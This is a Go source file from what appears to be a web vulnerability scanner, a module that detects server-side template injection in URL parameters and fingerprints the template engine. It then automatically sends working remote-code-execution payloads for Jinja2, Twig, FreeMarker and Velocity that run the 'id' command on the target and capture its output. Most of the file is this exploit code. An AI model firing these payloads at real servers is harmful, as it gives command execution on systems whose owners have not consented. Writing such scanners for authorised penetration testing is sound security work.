// Package ssti tests server-side template injection: it injects math
// expressions that template engines evaluate, confirms a hit when the evaluated
// result comes back, fingerprints the engine, and attempts engine-specific RCE.
package ssti

import (
	"io"
	"net/http"
	"net/http/httputil"
	"net/url"
	"regexp"
	"strings"

	"github.com/sayseven7/frameseven/internal/config"
	"github.com/sayseven7/frameseven/internal/finding"
	"github.com/sayseven7/frameseven/internal/tools/v1/recon"
)

// detectionProbes are template expressions that evaluate to 49 when the engine
// renders them. A hit is confirmed when the result appears and the raw
// expression does not.
var detectionProbes = []string{
	"{{7*7}}",
	"${7*7}",
	"<%= 7*7 %>",
	"#{7*7}",
	"${{7*7}}",
}

const expectedResult = "49"

// fingerprintProbe distinguishes Python Jinja2 (7777777) from numeric engines
// such as Twig (49) by multiplying a number by a string.
const fingerprintProbe = "{{7*'7'}}"

// rcePayloads map an engine name to a payload that runs `id` on the host.
var rcePayloads = map[string]string{
	"Jinja2":    "{{''.__class__.__mro__[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()}}",
	"Twig":      `{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}`,
	"FreeMarker": `<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}`,
	"Velocity":  `#set($str=$class.inspect("java.lang.Runtime").type)#set($chr=$class.inspect("java.lang.Character").type)#set($ex=$str.getRuntime().exec("id"))$ex`,
}

var idSignature = regexp.MustCompile(`uid=\d+\([^)]+\)`)

type response struct {
	status int
	body   string
	dump   string
}

// Run injects SSTI probes into every discovered parameter.
func Run(cfg *config.Config, client *http.Client, surface *recon.Surface) []finding.Finding {
	var findings []finding.Finding
	tested := map[string]bool{}

	for _, p := range surface.Params {
		u, err := url.Parse(p.Endpoint)
		if err != nil {
			continue
		}

		key := p.Name + "|" + u.Path
		if tested[key] {
			continue
		}

		tested[key] = true

		if f, ok := testParam(cfg, client, p); ok {
			findings = append(findings, f)
		}
	}

	return findings
}

func testParam(cfg *config.Config, client *http.Client, p recon.Param) (finding.Finding, bool) {
	orig := origValue(p)

	baseline := request(cfg, client, p, orig)
	if baseline != nil && strings.Contains(baseline.body, expectedResult) {
		return finding.Finding{}, false
	}

	var detected *response
	var hitProbe string

	for _, probe := range detectionProbes {
		resp := request(cfg, client, p, probe)
		if resp == nil {
			continue
		}

		if strings.Contains(resp.body, expectedResult) && !strings.Contains(resp.body, probe) {
			detected = resp
			hitProbe = probe
			break
		}
	}

	if detected == nil {
		return finding.Finding{}, false
	}

	engine := fingerprint(cfg, client, p)

	return buildFinding(cfg, client, p, engine, hitProbe, detected), true
}

func fingerprint(cfg *config.Config, client *http.Client, p recon.Param) string {
	resp := request(cfg, client, p, fingerprintProbe)
	if resp == nil {
		return ""
	}

	if strings.Contains(resp.body, "7777777") {
		return "Jinja2"
	}

	if strings.Contains(resp.body, expectedResult) {
		return "Twig"
	}

	return ""
}

func buildFinding(cfg *config.Config, client *http.Client, p recon.Param, engine, probe string, detected *response) finding.Finding {
	extracted := "probe: " + probe + " -> " + expectedResult
	if engine != "" {
		extracted += "\nengine: " + engine
	}

	severity := finding.High
	cvss := 8.1
	description := "A template expression was evaluated server-side (" + probe + " returned " + expectedResult + "), confirming server-side template injection."

	if output, payload := attemptRCE(cfg, client, p, engine); output != "" {
		severity = finding.Critical
		cvss = 9.8
		description = "A template expression was evaluated server-side and an engine-specific payload executed a system command, confirming remote code execution."
		extracted += "\nRCE payload: " + payload + "\ncommand output: " + output
	}

	return finding.Finding{
		Title:       "Server-side template injection in parameter '" + p.Name + "'",
		Module:      "ssti",
		Severity:    severity,
		OWASP:       "A03:2025 - Injection",
		CWE:         "CWE-94",
		CVSS:        cvss,
		Description: description,
		Evidence: finding.Evidence{
			Request:   detected.dump,
			Response:  trim(detected.body, 500),
			Extracted: extracted,
		},
		NextSteps: []string{
			"Never render user input as a template; pass it as data to a sandboxed context.",
			"Treat the host as compromised if RCE was confirmed and rotate exposed secrets.",
		},
	}
}

// attemptRCE tries engine-specific payloads. When the engine is unknown, every
// payload is tried. It returns the captured command output and the payload used.
func attemptRCE(cfg *config.Config, client *http.Client, p recon.Param, engine string) (string, string) {
	if payload, ok := rcePayloads[engine]; ok {
		if output := runRCE(cfg, client, p, payload); output != "" {
			return output, payload
		}

		return "", ""
	}

	for _, payload := range rcePayloads {
		if output := runRCE(cfg, client, p, payload); output != "" {
			return output, payload
		}
	}

	return "", ""
}

func runRCE(cfg *config.Config, client *http.Client, p recon.Param, payload string) string {
	resp := request(cfg, client, p, payload)
	if resp == nil {
		return ""
	}

	return idSignature.FindString(resp.body)
}

func origValue(p recon.Param) string {
	u, err := url.Parse(p.Endpoint)
	if err != nil {
		return "frx7"
	}

	if v := u.Query().Get(p.Name); v != "" {
		return v
	}

	return "frx7"
}

func request(cfg *config.Config, client *http.Client, p recon.Param, value string) *response {
	u, err := url.Parse(p.Endpoint)
	if err != nil {
		return nil
	}

	q := u.Query()
	q.Set(p.Name, value)
	u.RawQuery = q.Encode()

	req, err := http.NewRequest(http.MethodGet, u.String(), nil)
	if err != nil {
		return nil
	}

	req.Header.Set("User-Agent", cfg.UserAgent)

	dump, _ := httputil.DumpRequestOut(req, false)

	resp, err := client.Do(req)
	if err != nil {
		return nil
	}
	defer resp.Body.Close()

	body, _ := io.ReadAll(io.LimitReader(resp.Body, 1<<20))

	return &response{status: resp.StatusCode, body: string(body), dump: string(dump)}
}

func trim(s string, max int) string {
	s = strings.TrimSpace(s)
	if len(s) > max {
		return s[:max]
	}

	return s
}
